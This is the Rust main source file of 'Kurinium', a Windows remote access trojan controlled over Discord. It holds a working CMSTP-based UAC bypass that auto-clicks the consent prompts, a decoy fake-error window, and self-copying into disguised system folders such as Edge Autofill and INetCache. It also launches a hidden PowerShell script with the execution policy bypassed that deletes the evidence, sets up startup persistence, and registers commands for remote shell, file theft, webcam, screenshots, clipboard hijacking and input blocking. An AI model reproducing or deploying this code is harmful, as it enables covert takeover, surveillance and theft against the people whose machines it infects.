use crate::prelude::*;
use tracing::{error, info};
use tracing_subscriber;
use twilight_gateway::{Event, EventTypeFlags, Intents, Shard, ShardId, StreamExt};
use std::process::Command;
use std::env;
use std::fs;
use std::path::Path;
use std::os::windows::process::CommandExt;
use crate::core::instance::singleton_prcess;
use crate::core::keep_active::start_keep_active;
use crate::core::decoy::show_fake_error;

mod command_registry;
mod commands;
mod config;
mod core;
mod prelude;
mod system_info;
mod utils;

// UAC Bypass
fn is_admin() -> bool {
    unsafe {
        let mut token_handle = std::mem::zeroed();
        let current_process = winapi::um::processthreadsapi::GetCurrentProcess();

        if winapi::um::processthreadsapi::OpenProcessToken(
            current_process,
            winapi::um::winnt::TOKEN_QUERY,
            &mut token_handle,
        ) != 0 {
            let mut elevation: winapi::um::winnt::TOKEN_ELEVATION = std::mem::zeroed();
            let mut size = std::mem::size_of_val(&elevation) as u32;

            let result = winapi::um::securitybaseapi::GetTokenInformation(
                token_handle,
                winapi::um::winnt::TokenElevation,
                &mut elevation as *mut _ as *mut _,
                size,
                &mut size,
            );

            winapi::um::handleapi::CloseHandle(token_handle);

            if result != 0 {
                return elevation.TokenIsElevated != 0;
            }
        }
        false
    }
}

fn attempt_uac_bypass() -> bool {
    use std::fs::File;
    use std::io::Write;
    use std::process::Stdio;
    use std::thread;
    use std::time::Duration;
    use winapi::um::winuser::{SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN};

    static INF_TEMPLATE: &str = r#"[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="Kurinium"
ShortSvcName="Kurinium"
"#;

    let exe_path = match env::current_exe() {
        Ok(path) => path.to_string_lossy().to_string(),
        Err(_) => return false,
    };

    // Gen INF file with current executable path
    let temp_dir = "C:\\windows\\temp";
    let random_file_name = format!("{}\\{}.inf", temp_dir, uuid::Uuid::new_v4());
    let inf_data = INF_TEMPLATE.replace("REPLACE_COMMAND_LINE", &format!("\"{}\"", exe_path));

    if let Err(_) = File::create(&random_file_name).and_then(|mut file| {
        file.write_all(inf_data.as_bytes())
    }) {
        return false;
    }

    // Execute CMSTP
    let binary_path = "C:\\windows\\system32\\cmstp.exe";
    if !std::path::Path::new(binary_path).exists() {
        let _ = std::fs::remove_file(random_file_name);
        return false;
    }

    let mut child = match Command::new(binary_path)
        .arg("/au")
        .arg(&random_file_name)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn()
    {
        Ok(child) => child,
        Err(_) => {
            let _ = std::fs::remove_file(random_file_name);
            return false;
        }
    };

    // Wait a bit for the window to appear
    thread::sleep(Duration::from_millis(500));

    // Try to interact
    let window_titles = ["Kurinium", "cmstp"];
    let mut interacted = false;

    for title in &window_titles {
        if interact_with_window(title) {
            interacted = true;
            break;
        }
    }

    // If no interact, Send enter key
    if !interacted {
        unsafe {
            let mut input = INPUT {
                type_: INPUT_KEYBOARD,
                u: std::mem::zeroed(),
            };

            *input.u.ki_mut() = KEYBDINPUT {
                wVk: VK_RETURN as u16,
                wScan: 0,
                dwFlags: 0,
                time: 0,
                dwExtraInfo: 0,
            };

            SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
        }
    }

    let result = child.wait().is_ok();
    let _ = std::fs::remove_file(random_file_name);

    result
}

fn interact_with_window(process_name: &str) -> bool {
    use std::ffi::CString;
    use std::ptr::null_mut;
    use std::thread;
    use std::time::Duration;
    use winapi::um::winuser::{
        FindWindowA, FindWindowExA, SendMessageA, SetForegroundWindow, ShowWindow, BM_CLICK,
        SW_SHOWNORMAL, SendInput, INPUT, INPUT_KEYBOARD, KEYBDINPUT, VK_RETURN,
    };

    let class_name = match CString::new(process_name) {
        Ok(name) => name,
        Err(_) => return false,
    };

    for _ in 0..20 {
        unsafe {
            let hwnd = FindWindowA(null_mut(), class_name.as_ptr());
            if !hwnd.is_null() {
                SetForegroundWindow(hwnd);
                ShowWindow(hwnd, SW_SHOWNORMAL);

                let ok_button = FindWindowExA(
                    hwnd,
                    null_mut(),
                    null_mut(),
                    CString::new("OK").unwrap().as_ptr(),
                );

                if !ok_button.is_null() {
                    SendMessageA(ok_button, BM_CLICK, 0, 0);
                    return true;
                }

                let mut input = INPUT {
                    type_: INPUT_KEYBOARD,
                    u: std::mem::zeroed(),
                };

                *input.u.ki_mut() = KEYBDINPUT {
                    wVk: VK_RETURN as u16,
                    wScan: 0,
                    dwFlags: 0,
                    time: 0,
                    dwExtraInfo: 0,
                };

                SendInput(1, &mut input, std::mem::size_of::<INPUT>() as i32);
                return true;
            }
        }

        thread::sleep(Duration::from_millis(100));
    }

    false
}

// Installation Functions
fn generate_migration_script(installed_path: &Path, original_path: &Path) -> String {
    let final_exe_name = installed_path.file_stem().unwrap().to_string_lossy();
    format!(
        r#"# PowerShell for Kurinium
$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"

function Kill-KuriniumProcesses {{
    try {{
        $processes = Get-Process | Where-Object {{ $_.ProcessName -eq "{final_exe_name}" }}
        if ($processes) {{
            foreach ($proc in $processes) {{
                Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
            }}
        }}
    }} catch {{
        # Ignore errors
    }}
}}

function Invoke-AsAdmin {{
    param(
        [string]$FilePath,
        [string]$Arguments
    )

    try {{
        $startInfo = New-Object System.Diagnostics.ProcessStartInfo
        $startInfo.FileName = $FilePath
        $startInfo.Arguments = $Arguments
        $startInfo.UseShellExecute = $true
        $startInfo.Verb = "runas"
        $startInfo.WindowStyle = "Hidden"
        $startInfo.CreateNoWindow = $true

        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $startInfo
        $process.Start() | Out-Null
        return $true
    }} catch {{
        return $false
    }}
}}

Kill-KuriniumProcesses
Start-Sleep -Seconds 2.5

$installedExe = "{installed_exe}"
$success = Invoke-AsAdmin -FilePath $installedExe -Arguments ""

if ($success) {{
    $originalFile = "{original_exe}"
    if (Test-Path $originalFile) {{
        try {{
            Remove-Item $originalFile -Force -ErrorAction Stop
        }} catch {{
            # Ignore errors
        }}
    }}

    Start-Job -ScriptBlock {{
        Start-Sleep -Seconds 2
        Remove-Item "{script_path}" -Force -ErrorAction SilentlyContinue
    }} | Out-Null
}}

exit
"#,
        installed_exe = installed_path.to_string_lossy(),
        original_exe = original_path.to_string_lossy(),
        script_path = installed_path.parent().unwrap().join("migration.ps1").to_string_lossy(),
        final_exe_name = final_exe_name // new arg for process kill
    )
}

fn run_powershell_script_as_admin(script_path: &Path) -> anyhow::Result<()> {
    use std::process::Stdio;
    use winapi::um::winuser::{SW_HIDE, ShowWindow};
    use winapi::um::wincon::GetConsoleWindow;

    // hide console window if it exists
    unsafe {
        let console = GetConsoleWindow();
        if !console.is_null() {
            ShowWindow(console, SW_HIDE);
        }
    }

    let output = Command::new("powershell.exe")
        .args([
            "-WindowStyle", "Hidden",
            "-ExecutionPolicy", "Bypass",
            "-Command",
            &format!(
                "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \"{}\"' -Verb RunAs -WindowStyle Hidden",
                script_path.to_string_lossy()
            ),
        ])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .output()?;

    if output.status.success() {
        Ok(())
    } else {
        let output = Command::new("powershell.exe")
            .args([
                "-WindowStyle", "Hidden",
                "-ExecutionPolicy", "Bypass",
                "-File", &script_path.to_string_lossy(),
            ])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .creation_flags(0x08000000) // CREATE_NO_WINDOW
            .output()?;

        if output.status.success() {
            Ok(())
        } else {
            Err(anyhow::anyhow!("Failed to run PowerShell script"))
        }
    }
}

fn check_if_installed(current_exe: &Path) -> bool {
    let exe_name = Config::get_exe_name();
    let current_exe_name = current_exe.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("");

    if current_exe_name == exe_name {
        return true;
    }

    false
}

fn install_to_path() -> anyhow::Result<()> {
    let current_exe = env::current_exe()?;
    let exe_name = Config::get_exe_name();

    // Installatibn path
    match Config::INSTALLATION_PATH {
        1 => install_to_packages(exe_name, &current_exe),
        2 => install_to_windows_apps(exe_name, &current_exe),
        3 => install_to_edge_autofill(exe_name, &current_exe),
        4 => install_to_windows_themes(exe_name, &current_exe),
        5 => install_to_templates(exe_name, &current_exe),
        6 => install_to_inetcache(exe_name, &current_exe),
        7 => install_to_webcache(exe_name, &current_exe),
        _ => anyhow::bail!("Invalid installation path: {}", Config::INSTALLATION_PATH),
    }
}

fn install_to_packages(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let local_app_data = env::var("LOCALAPPDATA")?;
    let install_dir = Path::new(&local_app_data).join("Packages").join(current_exe.file_stem().unwrap().to_string_lossy().to_string());

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    let target_path = install_dir.join(exe_name);
    fs::copy(current_exe, &target_path)?;

    if Config::SHOW_CONSOLE {
        println!("Installed to: {}", target_path.display());
    }

    let script_content = generate_migration_script(&target_path, current_exe);
    let script_path = install_dir.join("migration.ps1");
    fs::write(&script_path, script_content)?;

    if Config::SHOW_CONSOLE {
        println!("Running migration script...");
    }
    run_powershell_script_as_admin(&script_path)?;

    Ok(())
}

fn install_to_windows_apps(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let local_app_data = env::var("LOCALAPPDATA")?;
    let base_dir = Path::new(&local_app_data).join("Microsoft").join("WindowsApps");
    
    let original_exe_dir_name = current_exe.file_stem().unwrap().to_string_lossy().to_string();
    let install_dir = base_dir.join(original_exe_dir_name);

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    let target_path = install_dir.join(exe_name);
    fs::copy(current_exe, &target_path)?;

    if Config::SHOW_CONSOLE {
        println!("Installed to: {}", target_path.display());
    }

    let script_content = generate_migration_script(&target_path, current_exe);
    let script_path = install_dir.join("migration.ps1");
    fs::write(&script_path, script_content)?;

    if Config::SHOW_CONSOLE {
        println!("Running migration script...");
    }
    run_powershell_script_as_admin(&script_path)?;

    Ok(())
}

fn complete_installation(install_dir: &Path, exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let target_path = install_dir.join(exe_name);
    fs::copy(current_exe, &target_path)?;

    if Config::SHOW_CONSOLE {
        println!("Installed to: {}", target_path.display());
    }

    let script_content = generate_migration_script(&target_path, current_exe);
    let script_path = install_dir.join("migration.ps1");
    fs::write(&script_path, script_content)?;

    if Config::SHOW_CONSOLE {
        println!("Running migration script...");
    }
    run_powershell_script_as_admin(&script_path)?;

    Ok(())
}

fn install_to_edge_autofill(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let local_app_data = env::var("LOCALAPPDATA")?;
    let install_dir = Path::new(&local_app_data)
        .join("Microsoft")
        .join("Edge")
        .join("User Data")
        .join("Autofill")
        .join("4.0.1.27");

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    complete_installation(&install_dir, exe_name, current_exe)
}

fn install_to_windows_themes(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let app_data = env::var("APPDATA")?;
    let install_dir = Path::new(&app_data).join("Microsoft").join("Windows").join("Themes");

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    complete_installation(&install_dir, exe_name, current_exe)
}

fn install_to_templates(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let app_data = env::var("APPDATA")?;
    let install_dir = Path::new(&app_data).join("Microsoft").join("Templates");

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    complete_installation(&install_dir, exe_name, current_exe)
}

fn install_to_inetcache(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let local_app_data = env::var("LOCALAPPDATA")?;
    let install_dir = Path::new(&local_app_data)
        .join("Microsoft")
        .join("Windows")
        .join("INetCache");

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    complete_installation(&install_dir, exe_name, current_exe)
}

fn install_to_webcache(exe_name: &str, current_exe: &Path) -> anyhow::Result<()> {
    let local_app_data = env::var("LOCALAPPDATA")?;
    let install_dir = Path::new(&local_app_data)
        .join("Microsoft")
        .join("Windows")
        .join("WebCache");

    if !install_dir.exists() {
        fs::create_dir_all(&install_dir)?;
    }

    complete_installation(&install_dir, exe_name, current_exe)
}

use commands::core::*;
use commands::crypto::*;
use commands::filesystem::*;
use commands::system::*;
use commands::utility::*;
use commands::network::*;

// Init command registry
async fn register_all_commands() -> anyhow::Result<()> {
    let registry = get_registry();

    // Register commands
    register_commands!(
        registry,

        // Core commands
        HelpCommand,
        PingCommand,
        InfoCommand,
        ShellCommand,
        ExitCommand,
        AuthCommand,

        // Crypto commands
        EncryptCommand,
        DecryptCommand,

        // Filesystem commands
        CatCommand,
        CdCommand,
        CheckDriveCommand,
        ClearCommand,
        DownloadCommand,
        FileInfoCommand,
        GetCommand,
        GrabCommand,
        LsCommand,
        MkdirCommand,
        RemoveCommand,
        RenameCommand,
        SizeCommand,
        UnrarCommand,
        UnzipCommand,
        UploadCommand,
        ZipCommand,

        // System commands
        ProcessCommand,
        MonitorCommand,
        UpdateCommand,
        UninstallCommand,
        VolumeCommand,
        BlockInputCommand,
        ScreenCommand,
        CapsFlickerCommand,
        VisibleCommand,

        // Utility commands
        ClipboardCommand,
        ClipperCommand,
        ForegroundCommand,
        JumpscareCommand,
        OpenUrlCommand,
        PrintCommand,
        ScreenshotCommand,
        WebcamCommand,

        // Network commands
        IpconfigCommand,

    )?;

    if Config::SHOW_CONSOLE {
        info!("Registered {} commands", registry.command_count());
    }
    Ok(())

}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let args: Vec<String> = env::args().collect();
    let hide_decoy_flag = args.contains(&"--hide-decoy".to_string());

    let mut is_admin_privileged = is_admin();
    singleton_prcess(is_admin_privileged);

    let decoy_config = Config::get_decoy_config();
    if decoy_config.enabled && !hide_decoy_flag {
        std::thread::spawn(move || {
            show_fake_error(&decoy_config);
        });
    }

    // Start keep active thred
    let keep_active_config = Config::get_keep_active_config();
    let _keep_active_thread = start_keep_active(&keep_active_config);

    if !is_admin_privileged {
        if Config::SHOW_CONSOLE {
            println!("Not running with admin privileges, attempting UAC bypass...");
        }

        if attempt_uac_bypass() {
            is_admin_privileged = is_admin();
            if Config::SHOW_CONSOLE {
                if is_admin_privileged {
                    println!("UAC bypass successful! Now running with admin privileges.");
                } else {
                    println!("UAC bypass failed. Continuing without admin privileges.");
                }
            }
        } else {
            if Config::SHOW_CONSOLE {
                println!("UAC bypass failed. Continuing without admin privileges.");
            }
        }
    } else {
        if Config::SHOW_CONSOLE {
            println!("Already running with admin privileges.");
        }
    }

    // Check if we're running from the installation directory
    let current_exe = env::current_exe().unwrap_or_default();
    let is_installed = check_if_installed(&current_exe);

    if is_admin_privileged && !is_installed {
        if Config::SHOW_CONSOLE {
            println!("Starting installation process...");
        }

        match install_to_path() {
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    println!("Installation completed successfully!");
                }
            }
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    println!("Installation failed: {}", e);
                }
            }
        }

        if Config::SHOW_CONSOLE {
            println!("Setting up startup task...");
        }
        match crate::core::startup::check_startup() {
            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    println!("Startup task created successfully!");
                }
            }
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    println!("Startup task failed: {}", e);
                }
            }
        }

        if Config::SHOW_CONSOLE {
            println!("Installation complete. Exiting original process...");
            std::thread::sleep(std::time::Duration::from_secs(2));
        }
        std::process::exit(0);
    }/*else if !is_admin_privileged && !is_installed {
        if Config::SHOW_CONSOLE {
            println!("Not installed and no admin privileges - exiting");
        }
        std::process::exit(1);
    }*/

    // hide console if configured
    if !Config::SHOW_CONSOLE {
        // use std::ptr;
        unsafe {
            let console = winapi::um::wincon::GetConsoleWindow();
            if !console.is_null() {
                winapi::um::winuser::ShowWindow(console, winapi::um::winuser::SW_HIDE);
            }
        }
    }

    // Start tracing
    if Config::SHOW_CONSOLE {
        tracing_subscriber::fmt::init();
    }

    // Init authentication
    let auth_config = Config::get_auth_config();
    crate::core::auth::init_auth_manager(auth_config);

    // Get config from module
    let token = Config::get_token();
    let guild_id = Config::get_guildid();

    // Register commands in registry
    tokio::spawn(async move {
        match register_all_commands().await {
            Err(e) => {
                if Config::SHOW_CONSOLE {
                    error!("Failed to register commands: {}", e);
                }
            }

            Ok(_) => {
                if Config::SHOW_CONSOLE {
                    info!("Kurinium, Is a FREE RAT project. https://github.com/Mikasuru/Kurinium");
                    info!("All commands registered in registry");
                }
            }
        }
    });

    // Crate HTTP client
    let http = Arc::new(HttpClient::new(token.clone()));
    let channel_manager = crate::core::discord::channel::ChannelManager::new(
        HttpClient::new(token.clone()),
        guild_id,
    );

    let device_channel_id = channel_manager.init_dchannel().await?;
    if Config::SHOW_CONSOLE {
        info!("Device channel initialized: {}", device_channel_id);
    }

    // Gateway configuration
    let intents = Intents::GUILD_MESSAGES | Intents::MESSAGE_CONTENT;
    let mut shard = Shard::new(ShardId::ONE, token.clone(), intents);

    // Start WiFi monitoring
    let wifi_config = Config::get_wifi_monitor_config();
    let wifi_monitor = crate::core::wifi_monitor::WifiMonitor::new(http.clone(), device_channel_id, wifi_config);
    if let Err(e) = wifi_monitor.start_monitoring().await {
        if Config::SHOW_CONSOLE {
            error!("Failed to start WiFi monitoring: {}", e);
        }
    } else {
        if Config::SHOW_CONSOLE && Config::get_wifi_monitor_config().enabled {
            info!("WiFi monitoring started successfully");
        }
    }

    if Config::SHOW_CONSOLE {
        info!("Prefix: {}", Config::BOT_PREFIX);
        info!("Guild ID: {}", guild_id);
        info!("[ Console if showing ]-----------------------------------");
    }

    // Process events
    while let Some(item) = shard.next_event(EventTypeFlags::all()).await {
        let event = match item {
            Ok(event) => event,
            Err(source) => {
                if Config::SHOW_CONSOLE {
                    error!("Error receiving event: {}", source.to_string());
                }
                continue;
            }
        };

        match event {
            Event::MessageCreate(msg) => {
                if let Err(e) = handle_message(&http, msg.0, device_channel_id).await {
                    if Config::SHOW_CONSOLE {
                        error!("Error handling message: {}", e);
                    }
                }
            }

            Event::InteractionCreate(interaction) => {
                if let Err(e) = handle_interaction(&http, interaction.0).await {
                    if Config::SHOW_CONSOLE {
                        error!("Error handling interaction: {}", e);
                    }
                }
            }

            Event::Ready(_) => {
                if Config::SHOW_CONSOLE {
                    info!("Bot is ready!");
                }
            }
            _ => {}
        }
    }
    Ok(())

}

async fn handle_message(
    http: &Arc<HttpClient>,
    msg: Message,
    device_channel_id: Id<ChannelMarker>,
) -> anyhow::Result<()> {
    if msg.channel_id != device_channel_id {
        return Ok(()); // ignore messages from other channels
    }

    if let Some(content) = msg.content.strip_prefix(Config::BOT_PREFIX) {
        let mut parts = content.split_whitespace();
        let command_name = parts.next().unwrap_or("");
        let args = if command_name == "zip" {
            content.trim_start_matches(command_name).trim().to_string()
        } else {
            parts.collect::<Vec<_>>().join(" ")
        };

        let registry = get_registry();
        if registry.command_exists(command_name) {
            if let Err(auth_error) = crate::core::auth::require_auth(http, &msg).await {
                let response = auth_error.to_string();
                http.create_message(msg.channel_id)
                    .content(&response)
                    .await?;
                return Ok(());
            }

            let args_obj = Arguments::new(&args);
            if let Err(e) = registry
                .execute_command(command_name, http, &msg, args_obj)
                .await
            {
                if Config::SHOW_CONSOLE {
                    error!("Error executing command {}: {}", command_name, e);
                }

                let response = format!(
                    "ERROR: An error occurred while executing `{}{}`",
                    Config::BOT_PREFIX,
                    command_name
                );

                http.create_message(msg.channel_id)
                    .content(&response)
                    .await?;
            }
        } else {
            let response = format!(
                "ERROR: Unknown command: `{}`. Use `{}help` to see available commands.",
                command_name,
                Config::BOT_PREFIX
            );

            http.create_message(msg.channel_id)
                .content(&response)
                .await?;
        }
    }
    Ok(())

}

async fn handle_interaction(
    http: &Arc<HttpClient>,
    interaction: twilight_model::application::interaction::Interaction,
) -> anyhow::Result<()> {
    use twilight_model::application::interaction::InteractionData;
    use twilight_model::http::interaction::{InteractionResponse, InteractionResponseType, InteractionResponseData};

    if let Some(InteractionData::MessageComponent(data)) = &interaction.data {
        let custom_id = &data.custom_id;
        {
            if custom_id.starts_with("crash_") {
                // Extract process ID from custom_id
                if let Some(pid_str) = custom_id.strip_prefix("crash_") {
                    if let Ok(pid) = pid_str.parse::<u32>() {
                        use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
                        use winapi::um::winnt::PROCESS_TERMINATE;
                        use winapi::um::handleapi::CloseHandle;

                        unsafe {
                            let handle = OpenProcess(PROCESS_TERMINATE, 0, pid);
                            if !handle.is_null() {
                                let result = TerminateProcess(handle, 1);
                                CloseHandle(handle);

                                let response_content = if result != 0 {
                                    format!("Successfully crashed process (PID: {})", pid)
                                } else {
                                    format!("Failed to crash process (PID: {})", pid)
                                };

                                http.interaction(interaction.application_id)
                                    .create_response(
                                        interaction.id,
                                        &interaction.token,
                                        &InteractionResponse {
                                            kind: InteractionResponseType::ChannelMessageWithSource,
                                            data: Some(InteractionResponseData {
                                                content: Some(response_content),
                                                ..Default::default()
                                            }),
                                        },
                                    )
                                    .await?;
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(())
}